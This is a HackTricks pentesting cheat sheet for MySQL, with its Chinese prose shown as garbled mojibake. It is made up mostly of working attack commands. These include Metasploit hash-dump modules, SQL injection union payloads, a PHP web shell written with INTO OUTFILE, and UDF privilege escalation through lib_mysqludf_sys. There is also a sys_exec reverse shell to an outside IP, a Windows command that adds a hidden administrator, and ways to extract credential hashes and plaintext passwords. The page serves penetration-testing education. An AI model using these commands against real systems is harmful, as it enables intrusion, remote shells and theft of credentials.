# 3306 - Pentesting Mysql

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASSï¼†HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹äº¤æµä¹‹åœ°ã€‚

{% embed url="https://www.rootedcon.com/" %}

## **åŸºæœ¬ä¿¡æ¯**

**MySQL**å¯ä»¥è¢«æè¿°ä¸ºä¸€ç§å¼€æº**å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰**ï¼Œå¯å…è´¹ä½¿ç”¨ã€‚å®ƒè¿è¡Œåœ¨**ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼ˆSQLï¼‰**ä¸Šï¼Œå¯ä»¥ç®¡ç†å’Œæ“ä½œæ•°æ®åº“ã€‚

**é»˜è®¤ç«¯å£ï¼š** 3306
```
3306/tcp open  mysql
```
## **è¿æ¥**

### **æœ¬åœ°**
```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```
### è¿œç¨‹
```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
## å¤–éƒ¨æšä¸¾

ä¸€äº›æšä¸¾æ“ä½œéœ€è¦æœ‰æ•ˆçš„å‡­æ®ã€‚
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```
### [**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#mysql)

### å†™å…¥ä»»ä½•äºŒè¿›åˆ¶æ•°æ®
```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```
## **MySQL å‘½ä»¤**
```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```
### MySQLæƒé™æšä¸¾
```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```
### MySQLæ–‡ä»¶RCE

æ‚¨å¯ä»¥åœ¨æ–‡æ¡£ä¸­æŸ¥çœ‹æ¯ä¸ªæƒé™çš„å«ä¹‰ï¼š[https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv\_execute)

### MySQLå®¢æˆ·ç«¯çš„ä»»æ„æ–‡ä»¶è¯»å–

å®é™…ä¸Šï¼Œå½“æ‚¨å°è¯•å°†**æœ¬åœ°æ•°æ®åŠ è½½åˆ°è¡¨ä¸­**æ—¶ï¼ŒMySQLæˆ–MariaDBæœåŠ¡å™¨ä¼šè¦æ±‚**å®¢æˆ·ç«¯è¯»å–æ–‡ä»¶**å¹¶å‘é€å†…å®¹ã€‚**å› æ­¤ï¼Œå¦‚æœæ‚¨èƒ½å¤Ÿç¯¡æ”¹ä¸€ä¸ªMySQLå®¢æˆ·ç«¯ä»¥è¿æ¥åˆ°æ‚¨è‡ªå·±çš„MySQLæœåŠ¡å™¨ï¼Œæ‚¨å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ã€‚**\
è¯·æ³¨æ„ï¼Œè¿™æ˜¯ä½¿ç”¨ä»¥ä¸‹è¡Œä¸ºï¼š
```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```
(æ³¨æ„"local"è¿™ä¸ªè¯)\
å› ä¸ºæ²¡æœ‰"local"ï¼Œä½ å¯èƒ½ä¼šå¾—åˆ°ï¼š
```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
**åˆå§‹ PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**åœ¨è¿™ç¯‡è®ºæ–‡ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å¯¹æ”»å‡»çš„å®Œæ•´æè¿°ï¼Œç”šè‡³å¦‚ä½•å°†å…¶æ‰©å±•åˆ° RCEï¼š** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å¯¹æ”»å‡»çš„æ¦‚è¿°ï¼š** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„ä¹‹ä¸€ã€‚ä½œä¸º**ä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†**çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹èšä¼šã€‚

{% embed url="https://www.rootedcon.com/" %}

## POST

### Mysql ç”¨æˆ·

å¦‚æœ mysql ä»¥ **root** ç”¨æˆ·èº«ä»½è¿è¡Œï¼Œå°†ä¼šéå¸¸æœ‰è¶£ï¼š
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```
#### MySQL é…ç½®æ–‡ä»¶ mysqld.cnf çš„å±é™©è®¾ç½®

åœ¨ MySQL æœåŠ¡çš„é…ç½®ä¸­ï¼Œé‡‡ç”¨äº†å„ç§è®¾ç½®æ¥å®šä¹‰å…¶æ“ä½œå’Œå®‰å…¨æªæ–½ï¼š

- **`user`** è®¾ç½®ç”¨äºæŒ‡å®š MySQL æœåŠ¡å°†åœ¨å“ªä¸ªç”¨æˆ·ä¸‹æ‰§è¡Œã€‚
- **`password`** ç”¨äºå»ºç«‹ä¸ MySQL ç”¨æˆ·å…³è”çš„å¯†ç ã€‚
- **`admin_address`** æŒ‡å®šåœ¨ç®¡ç†ç½‘ç»œæ¥å£ä¸Šç›‘å¬ TCP/IP è¿æ¥çš„ IP åœ°å€ã€‚
- **`debug`** å˜é‡è¡¨ç¤ºå½“å‰çš„è°ƒè¯•é…ç½®ï¼ŒåŒ…æ‹¬æ—¥å¿—ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚
- **`sql_warnings`** ç®¡ç†åœ¨å•è¡Œ INSERT è¯­å¥å‡ºç°è­¦å‘Šæ—¶æ˜¯å¦ç”Ÿæˆä¿¡æ¯å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«æ—¥å¿—ä¸­çš„æ•æ„Ÿæ•°æ®ã€‚
- é€šè¿‡ **`secure_file_priv`**ï¼Œæ•°æ®å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œçš„èŒƒå›´å—åˆ°é™åˆ¶ä»¥å¢å¼ºå®‰å…¨æ€§ã€‚
```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```
### é€šè¿‡åº“è¿›è¡Œæƒé™æå‡

å¦‚æœ **mysql æœåŠ¡å™¨ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œ**ï¼ˆæˆ–å…¶ä»–æ›´é«˜ç‰¹æƒç”¨æˆ·ï¼‰ï¼Œæ‚¨å¯ä»¥è®©å…¶æ‰§è¡Œå‘½ä»¤ã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ **ç”¨æˆ·å®šä¹‰å‡½æ•°**ã€‚è¦åˆ›å»ºç”¨æˆ·å®šä¹‰å‡½æ•°ï¼Œæ‚¨å°†éœ€è¦ä¸€ä¸ªè¿è¡Œ mysql çš„æ“ä½œç³»ç»Ÿçš„ **åº“**ã€‚

å¯ä»¥åœ¨ sqlmap å’Œ metasploit ä¸­æ‰¾åˆ°è¦ä½¿ç”¨çš„æ¶æ„åº“ï¼Œæ–¹æ³•æ˜¯æ‰§è¡Œ **`locate "*lib_mysqludf_sys*"`** å‘½ä»¤ã€‚**`.so`** æ–‡ä»¶æ˜¯ **Linux** åº“ï¼Œè€Œ **`.dll`** æ˜¯ **Windows** åº“ï¼Œè¯·é€‰æ‹©æ‚¨éœ€è¦çš„é‚£ä¸ªã€‚

å¦‚æœæ‚¨ **æ²¡æœ‰** è¿™äº›åº“ï¼Œæ‚¨å¯ä»¥ **å¯»æ‰¾å®ƒä»¬**ï¼Œæˆ–è€…ä¸‹è½½è¿™ä¸ª [**Linux C ä»£ç **](https://www.exploit-db.com/exploits/1518) å¹¶åœ¨æ˜“å—æ”»å‡»çš„ Linux æœºå™¨ä¸Š **ç¼–è¯‘**ã€‚
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
ç°åœ¨æ‚¨å·²ç»æœ‰äº†åº“ï¼Œä½œä¸ºç‰¹æƒç”¨æˆ·ï¼ˆrootï¼Ÿï¼‰ç™»å½•åˆ°Mysqlï¼Œå¹¶æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š

#### Linux
```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```
#### Windows
```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```
### ä»æ–‡ä»¶ä¸­æå–MySQLå‡­æ®

åœ¨ _/etc/mysql/debian.cnf_ ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç”¨æˆ· **debian-sys-maint** çš„**æ˜æ–‡å¯†ç **
```bash
cat /etc/mysql/debian.cnf
```
æ‚¨å¯ä»¥**ä½¿ç”¨è¿™äº›å‡­æ®ç™»å½•åˆ°MySQLæ•°æ®åº“**ã€‚

åœ¨æ–‡ä»¶ï¼š_/var/lib/mysql/mysql/user.MYD_ ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**æ‰€æœ‰MySQLç”¨æˆ·çš„å“ˆå¸Œå€¼**ï¼ˆå¯ä»¥ä»æ•°æ®åº“ä¸­çš„mysql.userä¸­æå–å‡ºæ¥ï¼‰_._

æ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œæå–å®ƒä»¬ï¼š
```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```
### å¯ç”¨æ—¥å¿—è®°å½•

æ‚¨å¯ä»¥åœ¨`/etc/mysql/my.cnf`æ–‡ä»¶ä¸­å–æ¶ˆæ³¨é‡Šä»¥ä¸‹è¡Œä»¥å¯ç”¨mysqlæŸ¥è¯¢çš„æ—¥å¿—è®°å½•ï¼š

![](<../.gitbook/assets/image (277).png>)

### æœ‰ç”¨çš„æ–‡ä»¶

é…ç½®æ–‡ä»¶

- windows \*
- config.ini
- my.ini
- windows\my.ini
- winnt\my.ini
- \<InstDir>/mysql/data/
- unix
- my.cnf
- /etc/my.cnf
- /etc/mysql/my.cnf
- /var/lib/mysql/my.cnf
- \~/.my.cnf
- /etc/my.cnf
- å‘½ä»¤å†å²
- \~/.mysql.history
- æ—¥å¿—æ–‡ä»¶
- connections.log
- update.log
- common.log

## é»˜è®¤çš„MySQLæ•°æ®åº“/è¡¨

{% tabs %}
{% tab title="information_schema" %}
ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="mysql" %}
columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user
{% endtab %}

{% tab title="performance_schema" %}
accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait\_by\_latency\
latest\_file\_io\
memory\_by\_host\_by\_current\_bytes\
memory\_by\_thread\_by\_current\_bytes\
memory\_by\_user\_by\_current\_bytes\
memory\_global\_by\_current\_bytes\
memory\_global\_total\
metrics\
processlist\
ps\_check\_lost\_instrumentation\
schema\_auto\_increment\_columns\
schema\_index\_statistics\
schema\_object\_overview\
schema\_redundant\_indexes\
schema\_table\_lock\_waits\
schema\_table\_statistics\
schema\_table\_statistics\_with\_buffer\
schema\_tables\_with\_full\_table\_scans\
schema\_unused\_indexes\
session\
session\_ssl\_status\
statement\_analysis\
statements\_with\_errors\_or\_warnings\
statements\_with\_full\_table\_scans\
statements\_with\_runtimes\_in\_95th\_percentile\
statements\_with\_sorting\
statements\_with\_temp\_tables\
sys\_config\
user\_summary\
user\_summary\_by\_file\_io\
user\_summary\_by\_file\_io\_type\
user\_summary\_by\_stages\
user\_summary\_by\_statement\_latency\
user\_summary\_by\_statement\_type\
version\
wait\_classes\_global\_by\_avg\_latency\
wait\_classes\_global\_by\_latency\
waits\_by\_host\_by\_latency\
waits\_by\_user\_by\_latency\
waits\_global\_by\_latency\
x$host\_summary\
x$host\_summary\_by\_file\_io\
x$host\_summary\_by\_file\_io\_type\
x$host\_summary\_by\_stages\
x$host\_summary\_by\_statement\_latency\
x$host\_summary\_by\_statement\_type\
x$innodb\_buffer\_stats\_by\_schema\
x$innodb\_buffer\_stats\_by\_table\
x$innodb\_lock\_waits\
x$io\_by\_thread\_by\_latency\
x$io\_global\_by\_file\_by\_bytes\
x$io\_global\_by\_file\_by\_latency\
x$io\_global\_by\_wait\_by\_bytes\
x$io\_global\_by\_wait\_by\_latency\
x$latest\_file\_io\
x$memory\_by\_host\_by\_current\_bytes\
x$memory\_by\_thread\_by\_current\_bytes\
x$memory\_by\_user\_by\_current\_bytes\
x$memory\_global\_by\_current\_bytes\
x$memory\_global\_total\
x$processlist\
x$ps\_digest\_95th\_percentile\_by\_avg\_us\
x$ps\_digest\_avg\_latency\_distribution\
x$ps\_schema\_table\_statistics\_io\
x$schema\_flattened\_keys\
x$schema\_index\_statistics\
x$schema\_table\_lock\_waits\
x$schema\_table\_statistics\
x$schema\_table\_statistics\_with\_buffer\
x$schema\_tables\_with\_full\_table\_scans\
x$session\
x$statement\_analysis\
x$statements\_with\_errors\_or\_warnings\
x$statements\_with\_full\_table\_scans\
x$statements\_with\_runtimes\_in\_95th\_percentile\
x$statements\_with\_sorting\
x$statements\_with\_temp\_tables\
x$user\_summary\
x$user\_summary\_by\_file\_io\
x$user\_summary\_by\_file\_io\_type\
x$user\_summary\_by\_stages\
x$user\_summary\_by\_statement\_latency\
x$user\_summary\_by\_statement\_type\
x$wait\_classes\_global\_by\_avg\_latency\
x$wait\_classes\_global\_by\_latency\
x$waits\_by\_host\_by\_latency\
x$waits\_by\_user\_by\_latency\
x$waits\_global\_by\_latency
{% endtab %}
{% endtabs %}

## HackTricksè‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```
â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„æ´»åŠ¨ä¹‹ä¸€ã€‚ä»¥**ä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†**ä¸ºä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹äº¤æµä¼šã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

